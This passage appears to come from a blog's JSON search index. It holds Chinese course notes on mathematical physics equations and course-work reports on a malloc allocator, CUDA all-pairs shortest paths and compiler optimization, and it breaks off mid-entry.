对齐次边界条件构成.对非齐次方程、齐次边界条件问题的求解方法用相应齐次问题的本征函数展开的方法将解与非齐次项按相应齐次问题的本征函数展开 (包括按多个本征函数的多重展开), 代入方程后比较系数, 得到展开的系数函数所满足的非齐次常微分方程. 解此方程即可得解.求特解的方法注意此特解不仅需满足非齐次方程, 还必须满足齐次边界条件.边界条件为非齐次时, 定解问题的求解方法在任何情况下, 都必须首先将边界条件齐次化. 边界条件齐次化后, 一般余下一个非齐次方程的问题.如有可能, 将方程和边界条件同时齐次化, 即选择齐次化函数也是偏微分方程的解, 那么就余下一个齐次定解问题.对于二维、三维乃至 $n$ 维空间内的波动方程或热传导方程定解问题, 如果有不止一对非齐次边界条件, 可以通过分拆为几个定解问题, 使得每个定解问题中只有一对非齐次边界条件.本征值问题本征值问题是分离变量法的核心问题. 本征函数的正交完备性为分离变量法提供了理论基础. 在实际操作上, 不论是齐次问题中将相应于不同本征函数的特解叠加成一般解, 还是将非齐次方程的解用本征函数展开, 确定叠加系数 (展开系数), 都取决于本征函数的基本性质 (详见第十六章).以两端固定弦的自由振动为例, 纠正集中错误说法和概念$$\\begin{align} & \\pdv[2]{u}{t} - a^2 \\pdv[2]{u}{x} = 0, & & & & 0 0, \\tag{1a} \\label{eq-12-1a} \\\\ & \\eval{u}_{x = 0} = 0, & & \\eval{u}_{x = l} = 0, & & t \\geqslant 0, \\tag{1b} \\label{eq-12-1b} \\\\ & \\eval{u}_{t = 0} = \\phi\\qty(x), & & \\eval{\\pdv{u}{t}}_{t = 0} = \\psi\\qty(x), & & 0 \\leqslant x \\leqslant l. \\tag{1c} \\label{eq-12-1c}\\end{align}$$定解问题 $\\eqref{eq-12-1a}$, $\\eqref{eq-12-1b}$, $\\eqref{eq-12-1c}$ 的特解为$u_n\\qty(x,t) = \\sin\\frac{n \\pi}{l} x \\qty(A_n \\sin\\frac{n \\pi}{l} a t + B_n \\cos\\frac{n \\pi}{l} a t).\\nonumber$类似的说法还有: 定解问题 $\\eqref{eq-12-1a}$, $\\eqref{eq-12-1b}$, $\\eqref{eq-12-1c}$ 的特解有无穷多个, $u_n\\qty(x, t)$, $n = 1, 2, 3, \\dots$.这类说法的错误在于: $u_n\\qty(x, t)$ 只满足齐次偏微分方程 $\\eqref{eq-12-1a}$ 和齐次边界条件 $\\eqref{eq-12-1b}$, 并不满足初始条件 $\\eqref{eq-12-1c}$. 所以, 正确的说法是: $u_n\\qty(x, t)$ 是满足其次偏微分方程 $\\eqref{eq-12-1a}$ 和齐次边界条件 $\\eqref{eq-12-1b}$ 的特解.换一个角度说, 作为定解问题, 只要它是适定的, 那就只有唯一的一个解, 不存在特解和通解.定解问题 $\\eqref{eq-12-1a}$, $\\eqref{eq-12-1b}$, $\\eqref{eq-12-1c}$ 的通解为$\\begin{equation} u\\qty(x, t) = \\sum_{n = 1}^{\\infty} \\sin\\frac{n \\pi}{l} x \\qty(A_n \\sin\\frac{n \\pi}{l} a t + B_n \\cos\\frac{n \\pi}{l} a t) c\\tag{2} \\label{eq-12-2}\\end{equation}$这种说法的错误和上面的第 1 种说法类似. 正确的说法是: $\\eqref{eq-12-2}$ 式是满足齐次偏微分方程 $\\eqref{eq-12-1a}$ 和齐次边界条件 $\\eqref{eq-12-1b}$ 的一般解. 注意, 这里称为一般解而非通解.而且, 更严格说, 这样的级数解只是形式解, 只有级数收敛, 并且能逐项求导两次, 才是满足 $\\eqref{eq-12-1a}$ 和 $\\eqref{eq-12-1b}$ 的一般解.从概念上说, 通解的说法, 只适用于常微分方程和偏微分方程. 对于二阶线性齐次常微分方程, 它的特解一定含有两个叠加常数. 对于二阶线性齐次偏微分方程, 如果它的通解存在的话, 一定含有两个任意函数." }, { "title": "第十三章 正交曲面坐标系", "url": "/course-notes/mathematical-physics-equations/2022/06/08/%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0-%E6%AD%A3%E4%BA%A4%E6%9B%B2%E9%9D%A2%E5%9D%90%E6%A0%87%E7%B3%BB/", "categories": "Course Notes, Mathematical Physics Equations", "tags": "untagged", "date": "2022-06-08 00:00:00 +0800", "snippet": "正交曲面坐标系中的问分算符表达式设正交曲面坐标系的三个坐标为 $\\xi_1$, $\\xi_2$, $\\xi_3$, 其孤元 $\\dd s$ 为$\\dd{s}^2 = \\sum_{i = 1}^3 H_i^2 \\dd{\\xi_i}^2,\\nonumber$其中 $H_i$ 是此正交曲面坐标系的度规, 一般是 $\\xi_1$, $\\xi_2$, $\\xi_3$ 的函数. 它可以通过直角坐标与正交曲面坐标之间的关系算出$H_i^2 = \\qty(\\pdv{x}{\\xi_i})^2 + \\qty(\\pdv{y}{\\xi_i})^2 + \\qty(\\pdv{z}{\\xi_i})^2 \\qc i = 1, 2, 3.\\nonumber$在球坐标系中,$\\begin{align*} & \\xi_1 = r, & & \\xi_2 = \\theta, & & \\xi_3 = \\phi, \\\\ & \\dd s_1 = \\dd r, & & \\dd s_2 = r \\dd\\theta, & & \\dd s_3 = r \\sin\\theta \\dd\\phi, \\\\ & H_1 = 1, & & H_2 = r, & & H_3 = r \\sin\\theta.\\end{align*}$在柱坐标系中,$\\begin{align*} & \\xi_1 = r, & & \\xi_2 = \\phi, & & \\xi_3 = z, \\\\ & \\dd s_1 = \\dd r, & & \\dd s_2 = r \\dd\\phi, & & \\dd s_3 = \\dd z, \\\\ & H_1 = 1, & & H_2 = r, & & H_3 = 1.\\end{align*}$标量函数 $u$ 的梯度一般正交曲面坐标系中标量函数 $u\\qty(\\xi_1, \\xi_2, \\xi_3)$ 的梯度$$\\grad{u} = \\qty(\\frac{1}{H_1} \\pdv{u}{\\xi_1}, \\frac{1}{H_2} \\pdv{u}{\\xi_2}, \\frac{1}{H_3} \\pdv{u}{\\xi_3}).\\tag{1} \\label{eq-13-1}$$球坐标系中标量函数 $u\\qty(r, \\theta, \\phi)$ 的梯度$$\\grad{u} = \\qty(\\pdv{u}{r}, \\frac{1}{r} \\pdv{u}{\\theta}, \\frac{1}{r \\sin\\theta} \\pdv{u}{\\phi}).\\nonumber$$柱坐标系中标量函数 $u\\qty(r, \\phi, z)$ 的梯度$$\\grad{u} = \\qty(\\pdv{u}{r}, \\frac{1}{r} \\pdv{u}{\\phi}, \\pdv{u}{z}).\\nonumber$$矢量函数 $\\vb*{A}$ 的散度一般正交曲面坐标系中矢量函数 $\\vb*{A}\\qty(\\xi_1, \\xi_2, \\xi_3)$ 的散度$$\\begin{equation} \\div\\vb*{A} = \\frac{1}{H_1 H_1 H_3} \\sum_{i = 1}^3 \\pdv{\\xi_i}(\\frac{H_1 H_2 H_3}{H_i} A_i) \\tag{2} \\label{eq-13-2}\\end{equation}$$球坐标系中适量函数 $\\vb*{A}\\qty(r, \\theta, \\phi)$ 的散度$$\\div\\vb*{A} = \\frac{1}{r^2} \\pdv{r}(r^2 A_r) + \\frac{1}{r \\sin\\theta} \\pdv{\\theta}(\\sin\\theta A_{\\theta}) + \\frac{1}{r \\sin\\theta} \\pdv{A_{\\phi}}{\\phi}.\\nonumber$$柱坐标系中适量函数 $\\vb*{A}\\qty(r, \\phi, z)$ 的散度$$\\div\\vb*{A} = \\frac{1}{r} \\pdv{r}(r A_r) + \\frac{1}{r} \\pdv{A_{\\phi}}{\\phi} + \\pdv{A_z}{z}.\\nonumber$$矢量函数 $\\vb*{A}$ 的旋度一般正交曲面坐标系中矢量函数 $\\vb*{A}\\qty(\\xi_1, \\xi_2, \\xi_3)$ 的旋度作用于标量函数 $u$ 的 Laplace 算符可由 $\\laplacian{u} = \\div\\grad{u}$ 得到.球坐标系中标量函数 $u\\qty(r, \\theta, \\phi)$ 的 Laplace 算符$$\\laplacian{u} = \\frac{1}{r^2} \\pdv{r}(r^2 \\pdv{u}{r}) + \\frac{1}{r \\sin\\theta} \\pdv{\\theta}(\\sin\\theta \\pdv{u}{\\theta}) + \\frac{1}{r^2 \\sin[2]{\\theta}} \\pdv[2]{u}{\\phi}.\\nonumber$$柱坐标系中标量函数 $u\\qty(r, \\phi, z)$ 的 Laplace 算符$$\\laplacian{u} = \\frac{1}{r} \\pdv{r}(r \\pdv{u}{r}) + \\frac{1}{r^2} \\pdv[2]{u}{\\phi} + \\pdv[2]{u}{z}.\\nonumber$$作用于矢量函数 $\\vb*{A}$ 的拉普拉斯算符Laplace 算符的不变性在常用的坐标变换下, 包括有线性变换 (如平移变换), 正交变换 (如空间转动) 及空间反射 ($\\vb{r}' = -\\vb{r}$) 等, Laplace 算符具有不变性,$\\pdv[2]{x'} + \\pdv[2]{y'} + \\pdv[2]{z'} = \\pdv[2]{x} + \\pdv[2]{y} + \\pdv[2]{z}.\\nonumber$Helmholtz 方程 $\\laplacian{u} + k^2 u = 0$ 在球坐标和柱坐标中分离变量球坐标系中 Helmholtz 方程为$\\frac{1}{r^2} \\pdv{r}(r^2 \\pdv{u}{r}) + \\frac{1}{r^2 \\sin\\theta} \\pdv{\\theta}(\\sin\\theta \\pdv{u}{\\theta}) + \\frac{1}{r^2 \\sin[2]{\\theta}} \\pdv[2]{u}{\\phi} + k^2 u = 0,\\nonumber$令 $u\\qty(r, \\theta, \\phi) = R\\qty(r) \\Theta\\qty(\\theta) \\Phi\\qty(\\phi)$, 则可分离出方程$\\frac{1}{r^2} \\dv{r}(r^2 \\dv{R}{r}) + \\qty(k^2 - \\frac{\\mu}{r^2}) R = 0, \\\\\\frac{1}{\\sin\\theta} \\dv{\\theta}(\\sin\\theta \\dv{\\Theta}{\\theta}) + \\qty(\\mu - \\frac{m^2}{\\sin[2]{\\theta}}) \\Theta = 0, \\\\\\Phi'' + m^2 \\Phi = 0.\\nonumber$第一个方程可化为 Bessel 方程, 当 $k = 0$ 时, 它是 Euler 型方程, 第二个方程称为连带 Legendre 方程.柱坐标系中 Helmholtz 方程为$\\frac{1}{r} \\pdv{r}(r \\pdv{u}{r}) + \\frac{1}{r^2} \\pdv[2]{u}{\\phi} + \\pdv[2]{u}{z} + k^2 u = 0.\\nonumber$令 $u\\qty(r, \\phi, z) = R\\qty(r) \\Phi\\qty(\\phi) Z\\qty(z)$, 则可分离出方程$\\frac{1}{r} \\dv{r}(r \\dv{R}{r}) + \\qty(k^2 - \\mu - \\frac{m^2}{r^2}) R = 0, \\\\\\Phi'' + m^2 \\Phi = 0, \\\\Z'' + \\mu Z = 0,\\nonumber$第一个方程可化为 Bessel 方程, 当 $k^2 - \\mu = 0$ 时, 退化为 Euler 型方程.应用中的几个问题在应用中常涉及特殊函数问题将在以下几章中讨论, 这里略去.在圆内第一类边值问题 (圆内 Dirichlet 问题) 中由周期边界条件构成本征值问题$\\Phi''\\qty(\\phi) + \\nu \\Phi\\qty(\\phi) = 0 \\qc \\phi \\in \\qty(0, 2 \\pi), \\\\\\Phi\\qty(0) = \\Phi\\qty(2 \\pi) \\qc \\Phi'\\qty(0) = \\Phi'\\qty(2 \\pi).\\nonumber$对本征值 $\\nu_0 = 0$, 本征函数$\\Phi_0\\qty(\\phi) = 1;\\nonumber$对本征值 $\\nu_m = m^2$ ($m \\neq 0$), 本征函数是二重简并的$\\Phi_m\\qty(\\phi) = \\begin{cases} \\sin{m \\phi}, \\\\ \\cos{m \\phi},\\end{cases} \\quad m = 1, 2, 3, \\dots\\nonumber$或$\\Phi_m\\qty(\\phi) = e^{i m \\phi} \\qc m = \\pm 1, \\pm 2, \\pm 3, \\dots.\\nonumber$本征函数的这两种取法, 不仅不同本征值的本征函数相互正交, 而且两个简并本征函数之间也是正交的." }, { "title": "第十七章 积分变换的应用", "url": "/course-notes/mathematical-physics-equations/2022/06/08/%E7%AC%AC%E5%8D%81%E4%B8%83%E7%AB%A0-%E7%A7%AF%E5%88%86%E5%8F%98%E6%8D%A2%E7%9A%84%E5%BA%94%E7%94%A8/", "categories": "Course Notes, Mathematical Physics Equations", "tags": "untagged", "date": "2022-06-08 00:00:00 +0800", "snippet": "常用的积分变换有 Laplace 变换和 Fourier 变换两种.Laplace 变换$$F\\qty(p) = \\int_0^{\\infty} f\\qty(t) e^{- p t} \\dd{t}.\\nonumber$$Laplace 变换通常对时间变量进行. 有关性质见第八章.Fourier 变换$$\\begin{gather*} F\\qty(k) = \\frac{1}{\\sqrt{2 \\pi}} \\int_{-\\infty}^{\\infty} f\\qty(x) e^{- i k x} \\dd{x}, \\\\ f\\qty(x) = \\frac{1}{\\sqrt{2 \\pi}} \\int_{-\\infty}^{\\infty} F\\qty(k) e^{i k x} \\dd{k}.\\end{gather*}$$通常适用于无界空间. 此外, 也还有半无界空间的 Fourier 变换 (即正弦变换或余弦变换) 与有限 Fourier 变换.采用积分变换法求解偏微分方程定解问题, 一般情形下可减少自变量的数目. 可以将偏微分方程变成常微分方程, 甚至代数方程来求解. 这种解法的优点是无须区别方程及边界条件齐次或非齐次. 还有一个很大的优点是, 一些具有奇异性质的函数, 例如阶跃函数、$\\delta$ 函数, 通过积分变换后, 变成连续函数, 易于处理." }, { "title": "第十一章 数学物理方程和定解条件", "url": "/course-notes/mathematical-physics-equations/2022/06/08/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E6%95%B0%E5%AD%A6%E7%89%A9%E7%90%86%E6%96%B9%E7%A8%8B%E5%92%8C%E5%AE%9A%E8%A7%A3%E6%9D%A1%E4%BB%B6/", "categories": "Course Notes, Mathematical Physics Equations", "tags": "untagged", "date": "2022-06-08 00:00:00 +0800", "snippet": "几种常见的数学物理方程波动方程在二阶线性偏微分方程的分类上属于双曲型方程.$\\begin{align*} & \\text{一维情形} & & \\pdv[2]{u}{t} - a^2 \\pdv[2]{u}{x} = f\\qty(x, t), \\\\ & \\text{二、三维情形} & & \\pdv[2]{u}{t} - a^2 \\laplacian{u} = f\\qty(r, t).\\end{align*}$热传导方程在二阶线性偏微分方程分类上属于抛物型方程.$\\begin{align*} & \\text{一维情形} & & \\pdv{u}{t} - \\kappa \\pdv[2]{u}{x} = f\\qty(x, t), \\\\ & \\text{二、三维情形} & & \\pdv{u}{t} - \\kappa \\laplacian{u} = f\\qty(r, t).\\end{align*}$稳定问题在二阶线性偏微分方程分类上属于椭圆型方程.$\\begin{align*} & \\text{Laplace 方程} & & \\laplacian{u} = 0, \\\\ & \\text{Poisson 方程} & & \\laplacian{u} = - f\\qty(r), \\\\ & \\text{Helmholtz 方程} & & \\laplacian{u} + k^2 u = 0.\\end{align*}$定解问题为了完全描述一个确定的物理问题, 除了给出物理场所遵从的方程之外, 还必须知道定解条件: 包括边界条件和初始条件 (稳定问题除外).初始条件 体系 内部及边界上每一点 在初始时刻 ($t = 0$) 的状况.对于波动问题, 需给出物体内部及边界上每一点在初始时刻相关物理量及其时间变化率的值, 即$\\eval{u\\qty(x, y, z, t)}_{t = 0} = \\phi\\qty(x, y, z) \\qc\\eval{\\pdv{u}{t}}_{t = 0} = \\psi\\qty(x, y, z) \\qc\\qty(x, y, z) \\in V.\\nonumber$对热传导问题, 需给出休系 内部及边界上每一点 在初始时刻 ($t = 0$) 相关物理量的值,$\\eval{u\\qty(x, y, z, t)}_{t = 0} = \\phi\\qty(x, y, z) \\qc\\qty(x, y, z) \\in V.\\nonumber$对不含时间的稳定问题当然没有初始条件.边界条件 在边界上 每一点 在 任何时刻 的状况 (见下).由方程及定解条件, 就构成定解问题.边界条件的各种可能形式在任何时刻 $t$, 每个边界点将具有各自的边界条件, 常见的边界条件有:第一、二、三类边界条件$$\\pqty{a u + \\beta \\pdv{u}{n}}_{\\Sigma} = 0,\\nonumber$$其中 $\\Sigma$ 是边界点的坐标, $\\eval{\\frac{\\partial u}{\\partial n}}_{\\Sigma}$ 是 $u$ 在边界面上各点的法向导数.若 $\\beta = 0$ 为第一类边界条件, 若 $\\alpha = 0$ 为第二类边界条件, 若二者均不为 0, 就是第三类边界条件.对一维情况, 边界就是两个端点 (设为 $a$, $b$, 且 $a &lt; b$), 则有$\\qty(\\alpha_1 u - \\beta_1 \\pdv{u}{x})_{x = a} = 0 \\qc\\qty(\\alpha_2 u + \\beta_2 \\pdv{u}{x})_{x = b} = 0,\\nonumber$在 $x = a$ 处的边界条件中符号来源于边界的法线方向为 $-x$ 方向.自然边界条件, 或称物理边界条件有界条件在非奇异的情况下 (非源点所在处), 物理量应是有界的. 经常用在坐标原点 $r=0$ 处.周期条件在平面极坐标、柱坐标和球坐标的经度坐标中实际物理场应满足 $2 \\pi$ 的周期条件.无穷远条件常用以下几种条件:$\\lim_{r \\to \\infty} u = 0; \\\\\\lim_{r \\to \\infty} u ~ \\text{有界} \\\\u ~ \\text{在} ~ r ~ \\text{大时有渐进性为} ~ f\\qty(\\vb*{r}, t) ~ \\text{(已知函数)}\\nonumber$连接条件, 存在于两种介质的界面处以一维问题为例, 在两种介质的连接点 $x = c$ 处, 可以满足:对波动问题:$\\begin{align*} & \\eval{u_1}_{x = c} = \\eval{u_2}_{x = c} & & \\text{(连接点两侧的位移相等)}, \\\\ & \\eval{E_1 \\pdv{u_1}{x}}_{x = c} = \\eval{E_2 \\pdv{u_2}{x}}_{x = c} & & \\text{(连接点两侧的应力相等)}; \\\\\\end{align*}$对热传导问题:$\\begin{align*} & \\eval{u_1}_{x = c} = \\eval{u_2}_{x = c} & & \\text{(连接点两侧的温度相等)}, \\\\ & \\eval{k_1 \\pdv{u_1}{x}}_{x = c} = \\eval{k_2 \\pdv{u_2}{x}}_{x = c} & & \\text{(连接点两侧的热流密度相等)}. \\\\\\end{align*}$" }, { "title": "Malloc Lab", "url": "/course-work/computer-organization-and-architecture/2022/06/06/malloc-lab/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Malloc Lab", "date": "2022-06-06 00:00:00 +0800", "snippet": "基于 Segregated Free Lists + First Fit + Immediate Coalescing + Smart Reallocation 实现.Segregated Free Lists使用最开始的 9 个 Word 存储 (0, 32], (32, 64], …, (2048, 4096], (4096, inf) 分块大小的 Free List Head, 同时维护这 9 个链表.在代码中, 我们约定 Pred 和 Succ 表示链表中的拓扑顺序, Prev 和 Next 表示 block 在 mem_heap 上的地址顺序.事实上, Explicit Free Lists 可看作 num_size_class = 1 的 Segregated Free Lists, 即只存储一个 Free List Head, 维护一个链表.Implicit Free Lists 相较于 Explicit Free List, 仅需修改 GetPred 和 GetSucc 沿 PrevBlock 和 NextBlock 遍历即可.First Fit从头开始搜索空闲链表, 选择第一个合适的空闲块.Immediate Coalescing这是一种最简单的实现, 即在每次一个块被释放时, 就合并所有相邻的块.或者, 也可以选择 Deferred Coalescing, 直到某次 malloc 失败后再扫描整个堆进行合并.Smart Reallocation若 new_size &lt; old_size, 则直接将原 block 压缩.否则, 若原 block 紧邻后面的一个 block 是空闲的, 则尝试将两者合并, 以减少拷贝.如果合并后的大小仍然不能满足 new_size 的要求, 则重新 malloc 一块足够大的空间, 拷贝并释放原有空间.mm_check()mm_check() 实现了如下检查: Prologue and Epilogue check header &amp; footer consistency check Is every block in the free list marked as free ? Are there any contiguous free blocks that somehow escaped coalescing ? Is every free block actually in the free list ? Do the pointers in the free list point to valid free blocks ? Do any allocated blocks overlap ? Do the pointers in a heap block point to valid heap addresses ?Performance下面是一些其他的策略的测试结果.Segregated Free Lists + First Fit + Immediate Coalescing + Smart Reallocationtrace valid util ops secs Kops 0 yes 97% 5694 0.000533 10677 1 yes 94% 5848 0.000573 10209 2 yes 98% 6648 0.000639 10397 3 yes 99% 5380 0.000518 10396 4 yes 66% 14400 0.000910 15828 5 yes 88% 4800 0.000725 6617 6 yes 86% 4800 0.000725 6623 7 yes 55% 12000 0.000946 12689 8 yes 51% 24000 0.001910 12568 9 yes 28% 14401 0.080342 17910 yes 26% 14401 0.001990 7235Total 72% 112372 0.089810 1251Perf index = 43 (util) + 40 (thru) = 83/100Implicit Free Lists + First Fit + Immediate Coalescing + Naive Reallocationtrace valid util ops secs Kops 0 yes 99% 5694 0.010029 568 1 yes 100% 5848 0.009354 625 2 yes 99% 6648 0.015462 430 3 yes 100% 5380 0.011415 471 4 yes 67% 14400 0.000296 48567 5 yes 92% 4800 0.010036 478 6 yes 92% 4800 0.009214 521 7 yes 55% 12000 0.248635 48 8 yes 51% 24000 0.442400 54 9 yes 31% 14401 0.136409 10610 yes 38% 14401 0.005392 2671Total 75% 112372 0.898644 125Perf index = 45 (util) + 8 (thru) = 53/100Implicit Free Lists + Next Fit + Immediate Coalescing + Naive Reallocationtrace valid util ops secs Kops 0 yes 90% 5694 0.002457 2317 1 yes 92% 5848 0.001583 3694 2 yes 95% 6648 0.004453 1493 3 yes 97% 5380 0.004644 1159 4 yes 67% 14400 0.000352 40874 5 yes 91% 4800 0.005377 893 6 yes 89% 4800 0.004953 969 7 yes 55% 12000 0.025501 471 8 yes 51% 24000 0.012525 1916 9 yes 31% 14401 0.136150 10610 yes 38% 14401 0.005432 2651Total 72% 112372 0.203427 552Perf index = 43 (util) + 37 (thru) = 80/100Implicit Free Lists + Best Fit + Immediate Coalescing + Naive Reallocationtrace valid util ops secs Kops 0 yes 99% 5694 0.013798 413 1 yes 100% 5848 0.012763 458 2 yes 99% 6648 0.020102 331 3 yes 100% 5380 0.015414 349 4 yes 67% 14400 0.000324 44403 5 yes 96% 4800 0.021954 219 6 yes 95% 4800 0.021399 224 7 yes 55% 12000 0.294868 41 8 yes 51% 24000 0.530547 45 9 yes 24% 14401 0.157507 9110 yes 26% 14401 0.005491 2622Total 74% 112372 1.094166 103Perf index = 44 (util) + 7 (thru) = 51/100" }, { "title": "PA3: 全源最短路", "url": "/course-work/introduction-to-high-performance-computing/2022/06/05/pa3-%E5%85%A8%E6%BA%90%E6%9C%80%E7%9F%AD%E8%B7%AF/", "categories": "Course Work, Introduction to High Performance Computing", "tags": "HPC, CUDA", "date": "2022-06-05 00:00:00 +0800", "snippet": "EnvironmentP100 GPU 最大支持每个 SM 64KB shared memory，但每个 thread block 最多只支持 48KBMethod使用 实验三 - 高性能计算导论实验文档 (tsinghua.edu.cn) 中的分块方法. 一个 thread block 处理一个矩阵分块. 每个 thread block 所需使用的数据全部拷贝到 shared memory 中. 在 threadIdx 的基础上偏移 i_start, j_start 或 center_block_start 即可将 shared memory 中的坐标映射到 global memory 中的不同矩阵分块.Phase 1k = [ p * b, (p + 1) * b )对于每个 thread block, 访问范围包括 k * k 共 b * b 个 int, 也即需要 b * b * sizeof(int) 大小的 shared memory.对于每个 p, 仅需一个 thread block 即可完成任务. 但是很浪费.Phase 2Horizontalk = [ p * b , (p + 1) * b )i = [ p * b , (p + 1) * b )j = [ blockIdx.x * b , (blockIdx.x + 1) * b )特别的, 若 j 的范围恰好在 center block 后, 即 blockIdx.x * b &gt;= center_block_start 时, 则需额外偏移 b.对于每个 thread block, 访问范围包括 i * j, i * k, k * j, 其中 i * j 和 k * j 重合, 因此共 2 * b * b 个 int.共需 (ceil(n / p) - 1) * 1 个 thread block.Verticalk = [ p * b , (p + 1) * b )i = [ blockIdx.y * b , (blockIdx.y + 1) * b )j = [ p * b , (p + 1) * b )特别的, 若 i 的范围恰好在 center block 后, 即 blockIdx.y * b &gt;= center_block_start 时, 则需额外偏移 b.对于每个 thread block, 访问范围包括 i x j, i x k, k x j, 其中 i x j 和 i x k 重合, 因此共 2 * b * b 个 int.共需 1 * (ceil(n / p) - 1) 个 thread block.Phase 3k = [ p * b , (p + 1) * b )i = [ blockIdx.y * b , (blockIdx.y + 1) * b )i = [ blockIdx.x * b , (blockIdx.x + 1) * b )特别的, 若 i 或 j 的范围恰好在 center block 后, 即 blockIdx * b &gt;= center_block_start 时, 则需额外偏移 b.对于每个 thread block, 访问范围包括 i x j, i x k, k x j, 均不重合, 共 3 * b * b 个 int.共需 (ceil(n / p) - 1) * (ceil(n / p) - 1) 个 thread block.综合考虑, 取 b = 32, 每个 thread block 共 32 x 32 个 thread, 既不会超出 shared memory 限制, 又能够避免 bank conflict.Performance n apspRef() (ms) apsp() (ms) Speedup 1000 14.814903 2.969371 4.98923947 2500 377.148402 37.660415 10.01445157 5000 2972.073596 260.960028 11.38899938 7500 10016.146987 872.866804 11.47500047 10000 22632.211686 2060.573817 10.98345107 在 n = 1000 下进行 profiling.nvprof EventsInvocations Event Name Min Max Avg TotalDevice \"Tesla P100-PCIE-16GB (0)\" Kernel: _GLOBAL__N__51_tmpxft_000981f1_00000000_20_apsp_compute_61_cpp1_ii_034c69fe::Phase2KernelHorizontal(int, int*, int, int) 96 shared_ld_bank_conflict 0 0 0 0 96 shared_st_bank_conflict 0 0 0 0 Kernel: _GLOBAL__N__51_tmpxft_000981f1_00000000_20_apsp_compute_61_cpp1_ii_034c69fe::Phase2KernelVertical(int, int*, int, int) 96 shared_ld_bank_conflict 0 0 0 0 96 shared_st_bank_conflict 0 0 0 0 Kernel: _GLOBAL__N__51_tmpxft_000981f1_00000000_20_apsp_compute_61_cpp1_ii_034c69fe::Phase1Kernel(int, int*, int, int) 96 shared_ld_bank_conflict 0 0 0 0 96 shared_st_bank_conflict 0 0 0 0 Kernel: _GLOBAL__N__51_tmpxft_000981f1_00000000_20_apsp_compute_61_cpp1_ii_034c69fe::Phase3Kernel(int, int*, int, int) 96 shared_ld_bank_conflict 0 0 0 0 96 shared_st_bank_conflict 0 0 0 0没有出现 bank conflict.nvprof MetricsInvocations Metric Name Metric Description Min Max AvgDevice \"Tesla P100-PCIE-16GB (0)\" Kernel: _GLOBAL__N__51_tmpxft_000981f1_00000000_20_apsp_compute_61_cpp1_ii_034c69fe::Phase2KernelHorizontal(int, int*, int, int) 96 branch_efficiency Branch Efficiency 100.00% 100.00% 100.00% 96 warp_execution_efficiency Warp Execution Efficiency 97.97% 100.00% 98.03% 96 warp_nonpred_execution_efficiency Warp Non-Predicated Execution Efficiency 81.95% 95.89% 95.26% 96 gld_efficiency Global Memory Load Efficiency 100.00% 100.00% 100.00% 96 gst_efficiency Global Memory Store Efficiency 100.00% 100.00% 100.00% 96 shared_efficiency Shared Memory Efficiency 67.38% 69.64% 67.45% Kernel: _GLOBAL__N__51_tmpxft_000981f1_00000000_20_apsp_compute_61_cpp1_ii_034c69fe::Phase2KernelVertical(int, int*, int, int) 96 branch_efficiency Branch Efficiency 100.00% 100.00% 100.00% 96 warp_execution_efficiency Warp Execution Efficiency 51.59% 100.00% 98.49% 96 warp_nonpred_execution_efficiency Warp Non-Predicated Execution Efficiency 41.59% 97.89% 95.93% 96 gld_efficiency Global Memory Load Efficiency 100.00% 100.00% 100.00% 96 gst_efficiency Global Memory Store Efficiency 100.00% 100.00% 100.00% 96 shared_efficiency Shared Memory Efficiency 18.58% 69.01% 67.43% Kernel: _GLOBAL__N__51_tmpxft_000981f1_00000000_20_apsp_compute_61_cpp1_ii_034c69fe::Phase1Kernel(int, int*, int, int) 96 branch_efficiency Branch Efficiency 100.00% 100.00% 100.00% 96 warp_execution_efficiency Warp Execution Efficiency 47.13% 100.00% 98.35% 96 warp_nonpred_execution_efficiency Warp Non-Predicated Execution Efficiency 46.31% 97.76% 96.15% 96 gld_efficiency Global Memory Load Efficiency 100.00% 100.00% 100.00% 96 gst_efficiency Global Memory Store Efficiency 100.00% 100.00% 100.00% 96 shared_efficiency Shared Memory Efficiency 18.52% 68.69% 67.12% Kernel: _GLOBAL__N__51_tmpxft_000981f1_00000000_20_apsp_compute_61_cpp1_ii_034c69fe::Phase3Kernel(int, int*, int, int) 96 branch_efficiency Branch Efficiency 100.00% 100.00% 100.00% 96 warp_execution_efficiency Warp Execution Efficiency 98.12% 100.00% 98.18% 96 warp_nonpred_execution_efficiency Warp Non-Predicated Execution Efficiency 84.89% 95.93% 95.23% 96 gld_efficiency Global Memory Load Efficiency 100.00% 100.00% 100.00% 96 gst_efficiency Global Memory Store Efficiency 100.00% 100.00% 100.00% 96 shared_efficiency Shared Memory Efficiency 67.69% 69.91% 67.75%可以看出各项指标的利用率都较充分, 但 shared memory 利用率较低." }, { "title": "exp8: 单机性能优化", "url": "/course-work/introduction-to-high-performance-computing/2022/06/05/exp8-%E5%8D%95%E6%9C%BA%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/", "categories": "Course Work, Introduction to High Performance Computing", "tags": "HPC", "date": "2022-06-05 00:00:00 +0800", "snippet": "Task 0Performance Option Elapsed Time / seconds Performance / GFlops -O0 1.0072 0.2665 -O1 0.3461 0.7755 -O2 0.3332 0.8057 -O3 0.0496 5.4081 -fast 0.0386 6.9524 Task 1Performance UNROLL_N Elapsed Time / seconds Performance / GFlops 1 2.0814 15.7431 2 1.9311 16.9688 4 1.8048 18.1562 8 1.7787 18.4227 16 1.8276 17.9297 回答问题Question 1请参考 ICC 手册 并简述参数 (-O0, -O1, -O2, -O3, -fast) 分别进行了哪些编译优化。每种参数罗列几个优化技术即可。Answer 1-O0禁用所有优化-O1 data-flow analysis code motion strength reduction and test replacement split-lifetime analysis instruction scheduling-O2 Vectorization Inlining of intrinsics inlining constant propagation forward substitution routine attribute propagation variable address-taken analysis dead static function elimination removal of unreferenced variables-O3 Fusion Block-Unroll-and-Jam collapsing if statements-fast interprocedural optimization between files optimization of floating-point divides that give slightly less precise results than full IEEE division link all libraries statically generate instructions for the highest instruction set availableQuestion 2请简述任务一中循环展开带来的好处。Answer 2 可以减少循环变量的比较次数和分支跳转次数 减少数据依赖, 增加并发, 充分利用 CPU 流水线" }, { "title": "exp7: CUDA 优化 (global memory, shared memory)", "url": "/course-work/introduction-to-high-performance-computing/2022/05/23/exp7-cuda-%E4%BC%98%E5%8C%96-global-memory-shared-memory/", "categories": "Course Work, Introduction to High Performance Computing", "tags": "HPC, CUDA", "date": "2022-05-23 00:00:00 +0800", "snippet": "分析 test_gmem.cu 的性能变化来源__global__ void stride_copy(float *dst, float *src) { int i = blockIdx.x * blockDim.x + threadIdx.x; dst[i * STRIDE] = src[i * STRIDE];}性能变化的主要来源是 GPU 